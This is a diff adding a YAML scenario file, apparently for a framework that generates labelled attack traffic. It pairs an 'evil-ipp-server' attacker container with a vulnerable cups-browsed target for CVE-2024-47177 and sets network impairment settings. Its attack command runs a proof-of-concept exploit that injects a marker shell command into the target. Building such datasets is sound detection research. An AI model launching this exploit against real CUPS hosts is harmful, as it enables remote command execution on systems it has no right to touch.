@@ -1,0 +1,27 @@
+attacker:
+  name: evil-ipp-server
+  image: ghcr.io/idlab-discover/concap/evil-ipp-server:1.1.0
+  atkCommand: python /attacker/evil-ipp-server/poc.py $ATTACKER_IP $TARGET_IP "echo 1 > /tmp/I_AM_VULNERABLE"
+  atkTime: 10s
+  cpuRequest: 500m
+  memRequest: 500Mi
+target:
+  name: cups-browsed
+  image: vulhub/cups-browsed:2.0.1
+  cpuRequest: 500m
+  memRequest: 500Mi
+network:
+  bandwidth: 100mbit
+  queueSize: 100ms
+  limit: "10000"
+  delay: 1ms
+  jitter: 0ms
+  distribution: normal
+  loss: 10%
+  corrupt: 10%
+  duplicate: 10%
+  seed: "0"
+labels:
+  cve: CVE-2024-47177
+  label: "1"
+  scenario: cups-browsed-0124
